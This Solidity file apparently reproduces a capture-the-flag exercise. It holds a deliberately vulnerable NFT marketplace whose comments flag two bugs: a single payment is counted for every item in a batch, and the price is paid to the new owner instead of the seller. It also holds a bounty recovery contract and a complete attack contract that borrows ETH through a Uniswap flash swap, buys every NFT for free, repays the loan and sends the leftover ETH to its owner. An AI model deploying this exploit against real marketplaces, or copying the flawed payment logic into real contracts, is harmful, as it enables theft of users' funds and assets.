// SPDX-License-Identifier: MIT
pragma solidity ^0.8.26;

import "@openzeppelin/contracts/token/ERC721/IERC721.sol";
import "@openzeppelin/contracts/token/ERC721/ERC721.sol";
import "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";

/**
 * @title FreeRiderNFTMarketplace
 * @notice A vulnerable NFT marketplace. The bug: it sends the payment to the buyer
 *         instead of the seller, and checks the buyer's balance AFTER the transfer.
 */
contract FreeRiderNFTMarketplace {
    uint256 public offersCount;
    mapping(uint256 => uint256) public offers; // tokenId => price
    IERC721 public token;

    event NFTOffered(address indexed offerer, uint256 tokenId, uint256 price);
    event NFTBought(address indexed buyer, uint256 tokenId, uint256 price);

    constructor(uint256 amount, address _token) payable {
        token = IERC721(_token);
        offersCount = amount;
    }

    function offerMany(uint256[] calldata tokenIds, uint256[] calldata prices) external {
        require(tokenIds.length == prices.length, "Length mismatch");
        for (uint256 i = 0; i < tokenIds.length; i++) {
            _offerOne(tokenIds[i], prices[i]);
        }
    }

    function _offerOne(uint256 tokenId, uint256 price) private {
        require(price > 0, "Price must be > 0");
        require(token.ownerOf(tokenId) == msg.sender, "Not owner");
        require(token.getApproved(tokenId) == address(this), "Not approved");
        offers[tokenId] = price;
        emit NFTOffered(msg.sender, tokenId, price);
    }

    function buyMany(uint256[] calldata tokenIds) external payable {
        for (uint256 i = 0; i < tokenIds.length; i++) {
            _buyOne(tokenIds[i]);
        }
    }

    function _buyOne(uint256 tokenId) private {
        uint256 priceToPay = offers[tokenId];
        require(priceToPay > 0, "Token not offered");

        // BUG: checks msg.value >= priceToPay but msg.value persists across loop iterations
        require(msg.value >= priceToPay, "Insufficient payment");

        token.safeTransferFrom(token.ownerOf(tokenId), msg.sender, tokenId);

        // BUG: pays the buyer (new owner) instead of the seller
        payable(token.ownerOf(tokenId)).transfer(priceToPay);

        emit NFTBought(msg.sender, tokenId, priceToPay);
    }

    receive() external payable {}
}

/**
 * @title FreeRiderRecovery
 * @notice Contract that receives stolen NFTs and pays a bounty.
 */
contract FreeRiderRecovery is IERC721Receiver {
    address public owner;
    address public beneficiary;
    IERC721 public nft;
    uint256 public price;
    uint256 public received;

    constructor(address _beneficiary, address _nft, uint256 _price) payable {
        owner = msg.sender;
        beneficiary = _beneficiary;
        nft = IERC721(_nft);
        price = _price;
    }

    function onERC721Received(
        address,
        address,
        uint256 _tokenId,
        bytes memory
    ) external override returns (bytes4) {
        require(msg.sender == address(nft), "Not the NFT");
        received++;
        nft.safeTransferFrom(address(this), beneficiary, _tokenId);
        return IERC721Receiver.onERC721Received.selector;
    }
}

/**
 * @title IUniswapV2Pair (simplified interface for flash swap)
 */
interface IUniswapV2Pair {
    function swap(uint256 amount0Out, uint256 amount1Out, address to, bytes calldata data) external;
    function token0() external view returns (address);
    function token1() external view returns (address);
}

interface IWETH {
    function deposit() external payable;
    function withdraw(uint256) external;
    function transfer(address to, uint256 value) external returns (bool);
    function balanceOf(address) external view returns (uint256);
}

/**
 * @title FreeRiderAttack
 * @notice Exploit: Use a Uniswap flash swap to borrow ETH, buy all NFTs for free
 *         (due to the marketplace bug), then repay the flash loan.
 */
contract FreeRiderAttack is IERC721Receiver {
    IUniswapV2Pair public pair;
    FreeRiderNFTMarketplace public marketplace;
    IWETH public weth;
    IERC721 public nft;
    address public recovery;
    address public owner;
    uint256 public nftCount;

    constructor(
        address _pair,
        address _marketplace,
        address _weth,
        address _nft,
        address _recovery,
        uint256 _nftCount
    ) {
        pair = IUniswapV2Pair(_pair);
        marketplace = FreeRiderNFTMarketplace(payable(_marketplace));
        weth = IWETH(_weth);
        nft = IERC721(_nft);
        recovery = _recovery;
        owner = msg.sender;
        nftCount = _nftCount;
    }

    function attack(uint256 flashAmount) external {
        // Initiate flash swap
        bytes memory data = abi.encode(flashAmount);
        uint256 amount0Out = pair.token0() == address(weth) ? flashAmount : 0;
        uint256 amount1Out = pair.token0() == address(weth) ? 0 : flashAmount;
        pair.swap(amount0Out, amount1Out, address(this), data);
    }

    // Uniswap V2 flash swap callback
    function uniswapV2Call(address, uint256, uint256, bytes calldata data) external {
        require(msg.sender == address(pair), "Not pair");

        uint256 flashAmount = abi.decode(data, (uint256));

        // Convert WETH to ETH
        weth.withdraw(flashAmount);

        // Buy all NFTs (exploiting the marketplace bug)
        uint256[] memory tokenIds = new uint256[](nftCount);
        for (uint256 i = 0; i < nftCount; i++) {
            tokenIds[i] = i;
        }
        marketplace.buyMany{value: flashAmount}(tokenIds);

        // Send NFTs to recovery
        for (uint256 i = 0; i < nftCount; i++) {
            nft.safeTransferFrom(address(this), recovery, i);
        }

        // Repay flash loan (0.3% fee)
        uint256 fee = (flashAmount * 3) / 997 + 1;
        uint256 repayAmount = flashAmount + fee;
        weth.deposit{value: repayAmount}();
        weth.transfer(address(pair), repayAmount);

        // Send remaining ETH to owner
        payable(owner).transfer(address(this).balance);
    }

    function onERC721Received(address, address, uint256, bytes memory) external pure override returns (bytes4) {
        return IERC721Receiver.onERC721Received.selector;
    }

    receive() external payable {}
}
